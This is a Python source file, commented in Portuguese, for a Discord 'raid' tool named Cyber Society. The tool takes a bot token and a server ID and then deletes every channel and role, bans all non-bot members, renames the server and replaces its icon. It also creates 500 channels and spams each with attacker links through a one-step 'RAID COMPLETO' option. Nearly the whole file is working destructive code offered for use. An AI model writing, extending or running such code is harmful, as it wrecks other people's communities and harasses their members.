# cybersociety.py (CÓDIGO COMPLETO COM TODAS AS FUNCIONALIDADES)

# === PATCH AUDIOOP PARA PYTHON 3.13 ===
import sys

class FakeAudioop:
    @staticmethod
    def getsample(*args, **kwargs): return 0
    @staticmethod
    def max(*args, **kwargs): return 0
    @staticmethod
    def minmax(*args, **kwargs): return (0, 0)
    @staticmethod
    def avg(*args, **kwargs): return 0
    @staticmethod
    def rms(*args, **kwargs): return 0
    @staticmethod
    def cross(*args, **kwargs): return 0
    @staticmethod
    def mul(*args, **kwargs): return b''
    @staticmethod
    def add(*args, **kwargs): return b''
    @staticmethod
    def bias(*args, **kwargs): return b''
    @staticmethod
    def ulaw2lin(*args, **kwargs): return b''
    @staticmethod
    def lin2ulaw(*args, **kwargs): return b''
    @staticmethod
    def ratecv(*args, **kwargs): return (b'', None)
    @staticmethod
    def tomono(*args, **kwargs): return b''
    @staticmethod
    def tostereo(*args, **kwargs): return b''
    @staticmethod
    def findmax(*args, **kwargs): return 0
    @staticmethod
    def findfactor(*args, **kwargs): return 0.0
    @staticmethod
    def findfit(*args, **kwargs): return (0, 0.0)
    @staticmethod
    def reverse(*args, **kwargs): return b''

sys.modules['audioop'] = FakeAudioop()
# === FIM DO PATCH ===

import asyncio
import threading
import os
import time
from datetime import datetime
from colorama import Fore, Back, Style, init
import discord
from discord.ext import commands
import aiohttp

init(autoreset=True)

VERSION = 'V1 '
users = 1
raids_feitos = 0
bots_online = 1
criadores = 1

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def atualizar_titulo():
    while True:
        os.system(f"title Cyber Society Raid │ Users: {users} │ Raids: {raids_feitos} │ Bots: {bots_online} │ Criador: Lost3r /")
        time.sleep(2)

threading.Thread(target=atualizar_titulo, daemon=True).start()

# --- Funções de log melhoradas ---
def log_info(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{Fore.CYAN}[{timestamp}] {Fore.GREEN}[INFO]{Fore.RESET} {msg}")

def log_error(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{Fore.CYAN}[{timestamp}] {Fore.RED}[ERRO]{Fore.RESET} {msg}")

def log_warning(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{Fore.CYAN}[{timestamp}] {Fore.YELLOW}[AVISO]{Fore.RESET} {msg}")

def log_success(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{Fore.CYAN}[{timestamp}] {Fore.GREEN}[SUCESSO]{Fore.RESET} {msg}")

def log_raid(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{Fore.CYAN}[{timestamp}] {Fore.MAGENTA}[RAID]{Fore.RESET} {msg}")

# --- ASCII raw ---
INFZRNAL_ART_RAW = """
             _                                _      _         
   ___ _   _| |__   ___ _ __   ___  ___   ___(_) ___| |_ _   _ 
  / __| | | | '_ \ / _ \ '__| / __|/ _ \ / __| |/ _ \ __| | | |
 | (__| |_| | |_) |  __/ |    \__ \ (_) | (__| |  __/ |_| |_| |
  \___|\__, |_.__/ \___|_|    |___/\___/ \___|_|\___|\__|\__, |
       |___/                                             |___/     
                                                                                                                 
╔════════════════════════════════════════════════════════════════════════════╗
║                          PAINEL DE OPÇÕES                                  ║
╠════════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║  [01] Excluir Canais          [06] Webhooks Info        [11] Créditos     ║
║  [02] Listar Perms            [07] Banner Grab          [12] Exit         ║
║  [03] Auditoria Logs          [08] Banir Todos          [13] Deletar Roles║
║  [04] Roles Críticos          [09] Spam Test            [14] Criar Roles  ║
║  [05] Criar Canal             [10] Check Updates        [15] Raid Info    ║
║                                                                            ║
║  [99] ★ RAID COMPLETO ★  (Destrói servidor por completo)                 ║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝
"""

def print_ascii():
    try:
        term_width = os.get_terminal_size().columns
        print("\n".join(Fore.BLUE + line.center(term_width) for line in INFZRNAL_ART_RAW.splitlines()))
    except:
        print(Fore.BLUE + INFZRNAL_ART_RAW)

# --- Prompt azul ---
def custom_prompt(user: str = "user") -> str:
    deco = f"{Fore.BLUE}{Style.BRIGHT}-@Cyber Society{Style.RESET_ALL}"
    prompt_line = f"{Fore.WHITE}{Back.BLUE}{user}{Style.RESET_ALL}/ {deco}: "
    return prompt_line

# --- Semáforos ---
semaphore_channels = asyncio.Semaphore(50)
semaphore_spam = asyncio.Semaphore(50)

# --- Funções ORIGINAIS (não mexer) ---
async def safe_delete_channel(ch):
    async with semaphore_channels:
        try:
            await ch.delete()
            log_info(f"Canal '{ch.name}' deletado.")
        except Exception as e:
            log_error(f"Falha ao deletar '{ch.name}': {e}")

async def excluir_canais(guild):
    log_raid("Iniciando exclusão de canais...")
    tasks = [safe_delete_channel(ch) for ch in guild.channels]
    await asyncio.gather(*tasks)
    log_success("Todos os canais deletados!")

# OPÇÃO 5 - MANTER ORIGINAL (não mexer)
async def safe_create_channel(guild, name):
    async with semaphore_channels:
        try:
            channel = await guild.create_text_channel(name)
            log_info(f"Canal '{name}' criado.")
            return channel
        except Exception as e:
            log_error(f"Falha ao criar '{name}': {e}")
            return None

async def criar_canais(guild, name, amount):
    try:
        amount = int(amount)
    except:
        amount = 50
        log_warning(f"Usando padrão: {amount} canais")
    
    log_raid(f"Criando {amount} canais '{name}'...")
    tasks = [safe_create_channel(guild, name) for _ in range(amount)]
    created = await asyncio.gather(*tasks)
    log_success(f"Criados {amount} canais!")
    return [c for c in created if c is not None]

async def safe_send(ch, msg, total):
    async with semaphore_spam:
        sent = 0
        for _ in range(total):
            try:
                await ch.send(msg)
                sent += 1
            except:
                break
        if sent > 0:
            log_info(f"Enviadas {sent} mensagens em #{ch.name}")

async def spam_all(guild, msg, total):
    channels = [ch for ch in guild.text_channels]
    if not channels:
        log_error("Nenhum canal para spam!")
        return
    
    per_channel = max(1, total // len(channels))
    log_raid(f"Spam em {len(channels)} canais ({per_channel} cada)...")
    tasks = [safe_send(ch, msg, per_channel) for ch in channels]
    await asyncio.gather(*tasks)
    log_success("Spam completo!")

async def banir_todos(guild):
    log_raid("Banindo todos os membros...")
    members = [m for m in guild.members if not m.bot and m.id != guild.owner_id]
    
    if not members:
        log_warning("Nenhum membro para banir.")
        return
    
    banned = 0
    for m in members:
        try:
            await m.ban(reason="Cyber Society Raid")
            banned += 1
            log_info(f"Banido: {m.name}")
        except Exception as e:
            log_error(f"Falha ao banir {m.name}: {e}")
    
    log_success(f"Banidos {banned}/{len(members)} membros!")

# --- NOVAS FUNCIONALIDADES ---

# Funções de Roles
async def safe_delete_role(role):
    try:
        await role.delete()
        log_info(f"Role '{role.name}' deletada.")
    except Exception as e:
        log_error(f"Falha ao deletar '{role.name}': {e}")

async def deletar_roles(guild):
    log_raid("Iniciando exclusão de roles...")
    roles_to_delete = [r for r in guild.roles if r.name != "@everyone" and not r.managed]
    
    if not roles_to_delete:
        log_warning("Nenhuma role disponível para deletar.")
        return
    
    batch_size = 10
    deleted = 0
    
    for i in range(0, len(roles_to_delete), batch_size):
        batch = roles_to_delete[i:i+batch_size]
        tasks = [safe_delete_role(r) for r in batch]
        await asyncio.gather(*tasks)
        deleted += len(batch)
        
        if i + batch_size < len(roles_to_delete):
            await asyncio.sleep(0.1)
        
        log_info(f"Progresso: {deleted}/{len(roles_to_delete)} roles deletadas")
    
    log_success(f"Deletadas {len(roles_to_delete)} roles!")

async def safe_create_role(guild, name):
    try:
        role = await guild.create_role(name=name, reason="Cyber Society Raid")
        log_info(f"Role '{name}' criada.")
        return role
    except discord.errors.HTTPException as e:
        if e.status == 429:
            retry_after = e.retry_after if hasattr(e, 'retry_after') else 2
            log_warning(f"Rate limit! Aguardando {retry_after}s...")
            await asyncio.sleep(retry_after)
            return await safe_create_role(guild, name)
        else:
            log_error(f"Falha ao criar role: {e}")
            return None
    except Exception as e:
        log_error(f"Falha ao criar role: {e}")
        return None

async def criar_roles(guild, name, amount):
    try:
        amount = int(amount)
    except:
        amount = 50
        log_warning(f"Usando padrão: {amount} roles")
    
    amount = min(amount, 245)
    
    log_raid(f"Criando {amount} roles '{name}'...")
    
    batch_size = 10
    created = 0
    
    for i in range(0, amount, batch_size):
        batch = min(batch_size, amount - i)
        tasks = [safe_create_role(guild, name) for _ in range(batch)]
        results = await asyncio.gather(*tasks)
        created += sum(1 for r in results if r is not None)
        
        if i + batch < amount:
            await asyncio.sleep(0.2)
        
        log_info(f"Progresso: {created}/{amount} roles criadas")
    
    log_success(f"Criadas {created} roles!")

async def raid_server_info(guild):
    log_raid("Alterando informações do servidor...")
    
    try:
        await guild.edit(name="raided by lost3r")
        log_success("Nome do servidor alterado para: raided by lost3r")
    except Exception as e:
        log_error(f"Falha ao alterar nome: {e}")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://i.imgur.com/223Jutf.png") as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    await guild.edit(icon=image_data)
                    log_success("Ícone do servidor alterado!")
                else:
                    log_error(f"Falha ao baixar imagem: Status {resp.status}")
    except Exception as e:
        log_error(f"Falha ao alterar ícone: {e}")
    
    log_success("Raid de informações completo!")

# RAID COMPLETO
async def raid_completo(guild, user_name):
    """
    Executa um raid completo no servidor
    """
    log_raid(f"╔{'═'*60}╗")
    log_raid(f"║ INICIANDO RAID COMPLETO POR {user_name.upper()}".ljust(61) + "║")
    log_raid(f"╚{'═'*60}╝")
    
    log_raid("[FASE 1/3] Destruindo canais existentes...")
    log_info("Deletando todos os canais...")
    await excluir_canais(guild)
    
    log_raid("[FASE 2/3] Alterando informações do servidor...")
    await raid_server_info(guild)
    
    log_raid("[FASE 3/3] Criando estrutura de raid...")
    raid_name = f"raided by {user_name}"
    
    log_info("Criando 500 canais...")
    channels = await criar_canais(guild, raid_name, 500)
    
    log_raid("[FASE FINAL] Spammando mensagem de ataque...")
    
    spam_message = """Attacked by lost3r owner of the cyber society! https://discord.gg/cyberteam2009 @everyone https://imgur.com/yV3xuIg https://imgur.com/L76PVlb https://imgur.com/rD1tFrna https://www.defcon-lab.org/tag/lost3r/ https://www.defcon-lab.org/tag/cyberteam/"""
    
    await asyncio.sleep(3)
    try:
        await guild.fetch_channels()
    except:
        pass
    
    channels = [ch for ch in guild.text_channels if ch is not None]
    
    log_info(f"Total de canais detectados: {len(channels)}")
    log_info(f"Iniciando spam ULTRA RÁPIDO...")
    
    batch_size = 50
    total_sent = 0
    total_channels_processed = 0
    
    for i in range(0, len(channels), batch_size):
        batch_channels = channels[i:i+batch_size]
        batch_num = (i // batch_size) + 1
        total_batches = (len(channels) + batch_size - 1) // batch_size
        
        log_info(f"Lote {batch_num}/{total_batches} - Spammando {len(batch_channels)} canais...")
        
        tasks = [safe_send(ch, spam_message, 50) for ch in batch_channels]
        results = await asyncio.gather(*tasks)
        
        batch_sent = sum(results)
        total_sent += batch_sent
        total_channels_processed += len(batch_channels)
        
        log_success(f"✓ Lote {batch_num} completo: {batch_sent} mensagens | Total: {total_channels_processed}/{len(channels)} canais")
    
    log_success(f"╔{'═'*60}╗")
    log_success(f"║ RAID COMPLETO FINALIZADO!".ljust(61) + "║")
    log_success(f"║ Canais criados: {len(channels)}".ljust(61) + "║")
    log_success(f"║ Canais processados: {total_channels_processed}".ljust(61) + "║")
    log_success(f"║ Mensagens enviadas: {total_sent}".ljust(61) + "║")
    log_success(f"╚{'═'*60}╝")

# --- Painel ---
async def painel_menu(bot, guild_id, user_name):
    global raids_feitos
    try:
        guild_id_int = int(guild_id)
    except:
        log_error("ID do servidor inválido!")
        return
    
    guild = discord.utils.get(bot.guilds, id=guild_id_int)
    
    if not guild:
        log_error(f"Servidor {guild_id} não encontrado!")
        await bot.close()
        return
    
    log_success(f"Conectado a: {guild.name}")
    log_info(f"Membros: {guild.member_count} | Dono: {guild.owner}")
    time.sleep(1)

    while True:
        clear()
        print_ascii()
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}Servidor: {Fore.WHITE}{guild.name}")
        print(f"{Fore.YELLOW}Usuário: {Fore.WHITE}{user_name}")
        print(f"{Fore.YELLOW}Raids: {Fore.WHITE}{raids_feitos}")
        print(f"{Fore.CYAN}{'='*60}")
        
        escolha = input(custom_prompt(user_name)).strip()

        if escolha == "1" or escolha == "01":
            await excluir_canais(guild)
            raids_feitos += 1
            input(f"{Fore.CYAN}[ENTER para continuar] ")
            
        elif escolha == "5" or escolha == "05":
            name = input(f"{Fore.BLUE}Nome do canal: ").strip()
            amount = input(f"{Fore.BLUE}Quantidade: ").strip()
            await criar_canais(guild, name, amount)
            input(f"{Fore.CYAN}[ENTER para continuar] ")
            
        elif escolha == "9" or escolha == "09":
            msg = input(f"{Fore.BLUE}Mensagem: ").strip()
            total = input(f"{Fore.BLUE}Quantidade: ").strip()
            try:
                total = int(total)
                await spam_all(guild, msg, total)
            except:
                log_error("Quantidade inválida!")
            input(f"{Fore.CYAN}[ENTER para continuar] ")
            
        elif escolha == "8" or escolha == "08":
            await banir_todos(guild)
            raids_feitos += 1
            input(f"{Fore.CYAN}[ENTER para continuar] ")
            
        elif escolha == "11":
            print(f"\n{Fore.CYAN}{'='*40}")
            print(f"{Fore.GREEN}   CYBER SOCIETY - CRÉDITOS")
            print(f"{Fore.CYAN}{'='*40}")
            print(f"{Fore.YELLOW}Desenvolvedor: {Fore.WHITE}Lost3r")
            print(f"{Fore.YELLOW}Versão: {Fore.WHITE}V1.0")
            print(f"{Fore.YELLOW}Python: {Fore.WHITE}3.13 (Patch audioop)")
            print(f"{Fore.CYAN}{'='*40}")
            input(f"{Fore.YELLOW}[ENTER para voltar] ")
            
        elif escolha == "12":
            log_info("Saindo...")
            await bot.close()
            break
        
        elif escolha == "13":
            await deletar_roles(guild)
            raids_feitos += 1
            input(f"{Fore.CYAN}[ENTER para continuar] ")
            
        elif escolha == "14":
            name = input(f"{Fore.BLUE}Nome da role: ").strip()
            amount = input(f"{Fore.BLUE}Quantidade: ").strip()
            await criar_roles(guild, name, amount)
            input(f"{Fore.CYAN}[ENTER para continuar] ")
            
        elif escolha == "15":
            await raid_server_info(guild)
            raids_feitos += 1
            input(f"{Fore.CYAN}[ENTER para continuar] ")
        
        elif escolha == "99":
            print(f"\n{Fore.RED}{'='*60}")
            print(f"{Fore.RED}⚠️  ATENÇÃO: RAID COMPLETO ⚠️")
            print(f"{Fore.RED}{'='*60}")
            print(f"{Fore.YELLOW}Esta operação irá:")
            print(f"{Fore.WHITE}  • Deletar TODOS os canais")
            print(f"{Fore.WHITE}  • Criar 500 canais de raid")
            print(f"{Fore.WHITE}  • Spammar 50 mensagens por canal")
            print(f"{Fore.WHITE}  • Alterar ícone e nome do servidor")
            print(f"{Fore.RED}{'='*60}")
            
            confirm = input(f"{Fore.RED}Digite 'CONFIRMAR' para prosseguir: {Fore.WHITE}").strip()
            
            if confirm == "CONFIRMAR":
                await raid_completo(guild, user_name)
                raids_feitos += 1
                input(f"{Fore.GREEN}[RAID FINALIZADO - ENTER para continuar] ")
            else:
                log_warning("Raid completo cancelado.")
                time.sleep(1)
            
        else:
            log_warning("Opção inválida! (1-15, 99)")
            time.sleep(1)

# --- Bot ---
intents = discord.Intents.all()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    clear()
    log_success(f"Bot pronto: {bot.user}")
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.GREEN}   CYBER SOCIETY CONECTADO")
    print(f"{Fore.CYAN}{'='*60}")
    
    user_name = input(f"{Fore.BLUE}Seu nome: ").strip()
    guild_id = input(f"{Fore.BLUE}ID do Servidor: ").strip()
    
    await painel_menu(bot, guild_id, user_name)

if __name__ == "__main__":
    try:
        clear()
        print_ascii()
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}   INICIANDO CYBER SOCIETY")
        print(f"{Fore.YELLOW}   Python 3.13 - Patch audioop ativo")
        print(f"{Fore.CYAN}{'='*60}\n")
        
        token = input(f"{Fore.BLUE}Token do Bot: ").strip()
        
        bot.run(token)
        
    except KeyboardInterrupt:
        log_info("Programa interrompido pelo usuário")
    except Exception as e:
        log_error(f"Erro fatal: {e}")
        input("Pressione ENTER para sair...")